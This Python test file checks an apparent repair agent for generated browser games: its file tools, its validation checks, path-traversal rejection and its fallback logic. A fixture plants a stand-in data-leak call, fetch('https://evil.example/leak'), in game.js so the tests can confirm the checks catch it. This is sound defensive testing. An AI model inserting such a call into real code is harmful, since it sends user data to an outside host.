"""repair 内层 agent：会话工具语义 + 节点接线/回退（全部离线，不触网不依赖 SDK）。"""
from app.agents import code_agent, nodes


def _files():
    return [
        {
            "path": "index.html",
            "content": '<html><head></head><body><canvas id="stage"></canvas><script src="game.js"></script></body></html>',
        },
        {"path": "style.css", "content": "canvas{display:block}"},
        {"path": "game.js", "content": "var score = 0; fetch('https://evil.example/leak');"},
    ]


def _outcome(**overrides):
    base = dict(
        files=_files(),
        changed=["game.js"],
        tokens=321,
        logs=["agent wrote game.js (24B)"],
        note="FIXED: removed fetch call",
        checks_ok=True,
        turns=3,
    )
    base.update(overrides)
    return code_agent.RepairOutcome(**base)


# ---- RepairSession 工具面 ----

def test_session_read_write_checks_roundtrip():
    s = code_agent.RepairSession.from_files(_files())
    assert "fetch" in s.read_file("game.js")
    report = s.run_checks()
    assert "CHECKS FAILED" in report and "fetch()" in report
    assert not s.checks_ok

    out = s.write_file("game.js", "var score = 0; function tick() { score += 1; }")
    assert "run_checks" in out
    assert s.changed == {"game.js"}
    report = s.run_checks()
    assert "ALL CHECKS PASSED" in report
    assert s.checks_ok

    files = s.to_files()
    assert [f["path"] for f in files] == ["index.html", "style.css", "game.js"]
    assert "fetch" not in files[2]["content"]


def test_session_write_resets_checks_flag():
    s = code_agent.RepairSession.from_files(_files())
    s.write_file("game.js", "var ok = 1;")
    s.run_checks()
    assert s.checks_ok
    s.write_file("game.js", "var broken = ;")
    assert not s.checks_ok  # 新编辑未复检前不可视为通过


def test_session_rejects_unknown_path_and_oversize():
    s = code_agent.RepairSession.from_files(_files())
    assert "not editable" in s.write_file("evil.js", "x")
    assert "no such file" in s.read_file("nope.js")
    big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
    assert "exceeds" in s.write_file("game.js", big)
    assert s.changed == set()


def test_skills_expose_runtime_contract():
    s = code_agent.RepairSession.from_files(_files())
    assert "gameweave-runtime" in s.list_skills()
    body = s.read_skill("gameweave-runtime")
    assert "postMessage" in body and "400KB" in body
    assert "unknown skill" in s.read_skill("nope")
    assert "unknown skill" in s.read_skill("../secrets")  # 路径穿越拒绝


def test_enabled_requires_flag_and_real_model(monkeypatch):
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", False)
    assert not code_agent.enabled({"use_real": True})
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", True)
    assert code_agent.enabled({"use_real": True})
    assert not code_agent.enabled({"use_real": False})
    assert not code_agent.enabled({})


# ---- 节点接线：agent 成功 / 不收敛回退 / 不可用回退 ----

def test_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.repair_code_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["_tokens_delta"] == 321
    assert out["_agent"] == "GameCodeAgentRepair"
    assert any("agent tool loop" in line for line in out["_logs"])
    assert any("agent self-checks passed" in line for line in out["_logs"])


def test_repair_node_falls_back_when_agent_unavailable(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: None)
    seen = {}

    def fake_generate(state, repair_error=None):
        seen["error"] = repair_error
        return _files(), 7, "template"

    monkeypatch.setattr(nodes, "_generate_code", fake_generate)
    out = nodes.repair_code_node(
        {"repair_attempts": 1, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    assert seen["error"] == "boom"
    assert out["repair_attempts"] == 2
    assert out["_tokens_delta"] == 7
    assert any("falling back to full regeneration" in line for line in out["_logs"])


def test_repair_node_fallback_keeps_agent_tokens(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(
        code_agent, "run_repair", lambda files, **kw: _outcome(checks_ok=False, note="GIVEUP: cannot fix")
    )
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 10, "template"))
    out = nodes.repair_code_node(
        {"repair_attempts": 0, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    # agent 花掉的 tokens 也要并入步骤增量，与 LLMCall 记账口径一致
    assert out["_tokens_delta"] == 331
    assert any("did not converge" in line for line in out["_logs"])


def test_repair_node_legacy_path_when_disabled(monkeypatch):
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 5, "template"))
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.repair_code_node({"repair_attempts": 0, "last_error": "x", "generated_files": _files()})
    assert not called["agent"]  # 默认关闭：完全不进 agent 路径
    assert out["_tokens_delta"] == 5


def test_revision_repair_node_agent_path_requires_changes(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    monkeypatch.setattr(
        nodes, "_generate_revision_code", lambda state, repair_error=None: (_files(), 4, ["game.js"], "model")
    )
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "revision produced no file changes",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "revision",
            "base_version": "v2",
        }
    )
    # 空编辑不满足 revision 门禁 → 回落单次修订，但 agent tokens 保留
    assert out["_tokens_delta"] == 4 + 321
    assert out["revision_result"]["changed_files"] == ["game.js"]


def test_revision_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "remix",
            "base_version": "v3",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["revision_result"] == {"changed_files": ["game.js"], "base_version": "v3"}
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}


def test_run_repair_returns_none_for_empty_bundle():
    assert code_agent.run_repair([], error="whatever") is None
